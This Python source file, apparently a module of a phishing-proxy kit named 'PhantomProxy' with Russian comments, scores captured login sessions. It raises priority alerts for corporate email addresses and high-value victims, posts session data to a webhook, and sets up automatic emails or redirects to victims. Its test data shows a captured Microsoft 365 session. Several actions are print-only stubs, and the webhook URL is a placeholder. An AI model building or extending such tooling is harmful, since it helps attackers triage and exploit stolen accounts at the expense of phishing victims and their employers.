#!/usr/bin/env python3
"""
PhantomProxy v8.0 - Smart Trigger System
- Триггеры на события
- Автоматические действия
- Условия и правила
- Custom webhooks
"""

import json
import sqlite3
import requests
from datetime import datetime
from pathlib import Path

DB_PATH = Path('/home/ubuntu/phantom-proxy/phantom.db')

class SmartTrigger:
    def __init__(self):
        self.db_path = DB_PATH
        self.triggers = []
        self.load_triggers()
    
    def get_db(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def load_triggers(self):
        """Загрузка триггеров из БД"""
        # В реальной версии загружаем из БД
        self.triggers = [
            {
                'id': 1,
                'name': 'High Quality Session',
                'condition': 'quality_score >= 80',
                'action': 'telegram_notification',
                'enabled': True
            },
            {
                'id': 2,
                'name': 'Corporate Email',
                'condition': 'email contains @company.com',
                'action': 'priority_alert',
                'enabled': True
            },
            {
                'id': 3,
                'name': 'Multiple Sessions',
                'condition': 'sessions_count > 10',
                'action': 'webhook',
                'enabled': False
            }
        ]
    
    def check_triggers(self, session_data):
        """Проверка триггеров"""
        triggered = []
        
        for trigger in self.triggers:
            if not trigger['enabled']:
                continue
            
            if self.evaluate_condition(trigger['condition'], session_data):
                triggered.append(trigger)
                self.execute_action(trigger['action'], session_data)
        
        return triggered
    
    def evaluate_condition(self, condition, data):
        """Вычисление условия"""
        try:
            # Простая реализация
            if 'quality_score >=' in condition:
                threshold = int(condition.split('>=')[1].strip())
                return data.get('quality_score', 0) >= threshold
            
            if 'email contains' in condition:
                domain = condition.split('contains')[1].strip()
                return domain in data.get('email', '')
            
            if 'sessions_count >' in condition:
                threshold = int(condition.split('>')[-1].strip())
                return data.get('sessions_count', 0) > threshold
            
            return False
        except:
            return False
    
    def execute_action(self, action, data):
        """Выполнение действия"""
        if action == 'telegram_notification':
            self.send_telegram_alert(data)
        elif action == 'priority_alert':
            self.send_priority_alert(data)
        elif action == 'webhook':
            self.send_webhook(data)
    
    def send_telegram_alert(self, data):
        """Отправка Telegram уведомления"""
        print(f'📱 Telegram Alert: High quality session detected')
        print(f'   Email: {data.get("email", "N/A")}')
        print(f'   Quality: {data.get("quality_score", 0)}')
    
    def send_priority_alert(self, data):
        """Отправка приоритетного алерта"""
        print(f'🚨 PRIORITY ALERT: Corporate email detected')
        print(f'   Email: {data.get("email", "N/A")}')
        print(f'   Company: {data.get("email", "").split("@")[-1]}')
    
    def send_webhook(self, data):
        """Отправка webhook"""
        webhook_url = 'https://your-webhook.com/phantom-alert'
        
        try:
            response = requests.post(webhook_url, json={
                'event': 'trigger_activated',
                'data': data,
                'timestamp': datetime.now().isoformat()
            }, timeout=10)
            
            print(f'📡 Webhook sent: {response.status_code}')
        except:
            print(f'❌ Webhook failed')
    
    def add_trigger(self, name, condition, action):
        """Добавление триггера"""
        trigger = {
            'id': len(self.triggers) + 1,
            'name': name,
            'condition': condition,
            'action': action,
            'enabled': True
        }
        
        self.triggers.append(trigger)
        print(f'✅ Trigger added: {name}')
        
        return trigger
    
    def get_trigger_stats(self):
        """Статистика триггеров"""
        return {
            'total': len(self.triggers),
            'enabled': sum(1 for t in self.triggers if t['enabled']),
            'disabled': sum(1 for t in self.triggers if not t['enabled']),
            'triggers': self.triggers
        }

class AutoResponder:
    def __init__(self):
        self.responses = []
    
    def add_response(self, trigger_id, response_type, response_data):
        """Добавление автоматического ответа"""
        self.responses.append({
            'trigger_id': trigger_id,
            'type': response_type,
            'data': response_data
        })
    
    def execute(self, trigger_id, session_data):
        """Выполнение ответа"""
        for response in self.responses:
            if response['trigger_id'] == trigger_id:
                if response['type'] == 'email':
                    self.send_email(response['data'], session_data)
                elif response['type'] == 'redirect':
                    self.redirect(response['data'], session_data)
    
    def send_email(self, email_data, session_data):
        """Отправка email"""
        print(f'📧 Sending email to {session_data.get("email", "N/A")}')
    
    def redirect(self, url, session_data):
        """Редирект"""
        print(f'🔀 Redirecting to {url}')

if __name__ == '__main__':
    trigger = SmartTrigger()
    
    print('🎯 Smart Trigger System')
    stats = trigger.get_trigger_stats()
    print(f'📊 Triggers: {json.dumps(stats, indent=2)}')
    
    # Тест
    test_session = {
        'email': 'user@company.com',
        'quality_score': 85,
        'service': 'Microsoft 365'
    }
    
    print(f'\n🧪 Testing with session: {test_session}')
    triggered = trigger.check_triggers(test_session)
    print(f'✅ Triggered: {len(triggered)} triggers')
